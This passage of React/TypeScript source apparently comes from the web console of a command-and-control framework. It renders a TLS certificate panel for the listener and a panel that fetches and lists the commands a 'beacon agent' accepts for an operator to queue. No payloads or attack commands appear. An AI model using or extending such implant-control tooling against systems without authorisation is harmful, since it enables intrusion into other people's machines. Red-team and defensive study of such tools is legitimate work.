    else setMsg(String((res.data as { error?: string })?.error || 'Failed'))
    load()
  }

  return (
    <div className="flex-1 flex flex-col p-4 gap-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <FileLock size={17} className="text-phantom-magenta" />
          <h2 className="text-sm font-bold text-text-primary">TLS Certificates</h2>
        </div>
        <button onClick={load} className="text-text-dim hover:text-text-primary"><RefreshCw size={13} /></button>
      </div>
      <p className="text-xs text-text-dim -mt-2">Auto-generated server.crt + server.key for HTTPS/mTLS. Rotated on listener start if missing.</p>

      {msg && <div className="text-xs px-3 py-2 rounded bg-phantom-green/10 text-phantom-green border border-phantom-green/30">{msg}</div>}

      {certs ? (
        <div className="space-y-2">
          <div className="flex items-center gap-2 text-xs">
            <span className={`w-2 h-2 rounded-full ${certs.present ? 'bg-phantom-green' : 'bg-text-dim'}`} />
            <span className="text-text-secondary">{certs.present ? 'Certificates present' : 'No certificates'}</span>
          </div>
          {certs.files.map((f) => (
            <div key={f.name} className="bg-surface border border-surface-border rounded px-3 py-2 flex justify-between text-xs">
              <span className="font-mono text-text-primary">{f.name}</span>
              <span className="text-text-dim">{f.size} bytes</span>
            </div>
          ))}
          {certs.present && (
            <button onClick={handleUninstall}
              className="w-full py-2 rounded text-xs font-semibold bg-phantom-error/20 text-phantom-error hover:bg-phantom-error/30 transition-colors flex items-center justify-center gap-2">
              <Trash2 size={12} /> Remove Certificates
            </button>
          )}
        </div>
      ) : (
        <div className="text-xs text-text-dim p-4 text-center">Click refresh to load cert status</div>
      )}
    </div>
  )
}

// ── Beacon Help Panel ──────────────────────────────────────────────────────

export interface BeaconCommand { command: string; description: string; platform?: string }

/** Fetch the full beacon command catalog (shared with the palette). */
export async function fetchBeaconCommands(api: ReturnType<typeof useApi>['api'])
  : Promise<BeaconCommand[]> {
  const res = await api('GET', '/api/c2/beacon-help')
  if (res.status === 200) {
    return ((res.data as { commands?: BeaconCommand[] }).commands) || []
  }
  return []
}

function BeaconHelpPanel({ api }: { api: ReturnType<typeof useApi>['api'] }) {
  const [commands, setCommands] = useState<BeaconCommand[]>([])
  const [msg, setMsg] = useState('')
  const [filter, setFilter] = useState('')

  const load = async () => {
    const cmds = await fetchBeaconCommands(api)
    setCommands(cmds)
    if (cmds.length === 0) setMsg('Failed to load beacon commands')
  }

  // auto-load once on mount — the operator should never have to click
  // refresh to see the command list
  useEffect(() => { load() }, [])

  const filtered = commands.filter((c) =>
    !filter || c.command.toLowerCase().includes(filter.toLowerCase())
    || c.description.toLowerCase().includes(filter.toLowerCase()))

  return (
    <div className="flex-1 flex flex-col p-4 gap-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <HelpCircle size={17} className="text-phantom-cyan" />
          <h2 className="text-sm font-bold text-text-primary">Beacon Commands</h2>
        </div>
        <button onClick={load} className="text-text-dim hover:text-text-primary"><RefreshCw size={13} /></button>
      </div>
      <p className="text-xs text-text-dim -mt-2">All commands supported by the cross-platform beacon agent. Queue them via the Interact panel — the task input also autocompletes while you type.</p>

      <input value={filter} onChange={(e) => setFilter(e.target.value)}
        placeholder="filter commands…"
        className="bg-surface border border-surface-border rounded px-3 py-1.5 text-xs font-mono text-text-primary placeholder-text-dim focus:outline-none focus:border-phantom-cyan" />

      {msg && <div className="text-xs text-phantom-error">{msg}</div>}

      <div className="overflow-auto flex-1">
        {filtered.length === 0 ? (
          <div className="text-xs text-text-dim p-4 text-center">{commands.length === 0 ? 'Loading…' : 'No matching commands'}</div>
        ) : (
          <table className="w-full text-xs">
            <thead><tr className="text-text-dim border-b border-surface-border">
              <th className="text-left py-1.5 px-3">Command</th>
              <th className="text-left py-1.5 px-3">Description</th>
              <th className="text-left py-1.5 px-3 w-20">Platform</th>
            </tr></thead>
            <tbody>
              {filtered.map((cmd) => (
                <tr key={cmd.command} className="border-b border-surface-border/50 hover:bg-surface-hover/50">
                  <td className="py-1.5 px-3 font-mono text-text-primary">{cmd.command}</td>
                  <td className="py-1.5 px-3 text-text-secondary">{cmd.description}</td>
                  <td className="py-1.5 px-3 text-[10px] text-text-dim">{cmd.platform || 'all'}</td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>
    </div>
  )
}